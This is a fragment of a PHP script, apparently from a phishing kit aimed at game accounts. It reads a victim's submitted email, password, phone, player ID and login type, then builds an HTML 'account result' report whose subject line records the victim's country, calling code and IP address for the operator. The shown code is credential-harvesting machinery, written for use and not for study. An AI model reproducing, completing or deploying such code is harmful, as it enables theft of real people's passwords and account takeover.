...
if($email == "" && $password == "" && $codetel == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = " $lenzz_countryCode - $lenzz_flag | +$lenzz_callcode | LOGIN $login | IP: $lenzz_ipaddress";
$pesan = '
<center>
...
<th style="border-color: black; background: url('.$banner.') no-repeat center center; background-size: 100% 100%; width: 100%; color: #000; text-align: center; padding: 12px;height: 90px;">
</th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
<th style="border:0;line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 70%; color: #fff; text-align: left; padding: 12px;"><strong>Account Information</strong></th>
<th style="border:0;line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #fff; width: 25%; color: #000; text-align: center; padding: 12px;"><strong>#1</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
...
<tr style="border-top:0;">
<th style="border:0;border-top:0; line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: black; background: #000; width: 65%; color: #fff; text-align: left; padding: 12px;"><strong>Additional Information</strong></th>
<th style="border:0;line-height: 10px; font-size: 14px; border-collapse: collapse; border-color: white; background: #fff; width: 25%; color: #000; text-align: center; padding: 12px;"><strong>#2</strong></th>
</tr>
</table>
<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
<tr style="border-top:0;">
...
<tr>
<th style="height: 25px; background-color: #f5f5f5; width: 35%; text-align:left; padding-left:15px;"><strong>ZONE TIME</strong></th>
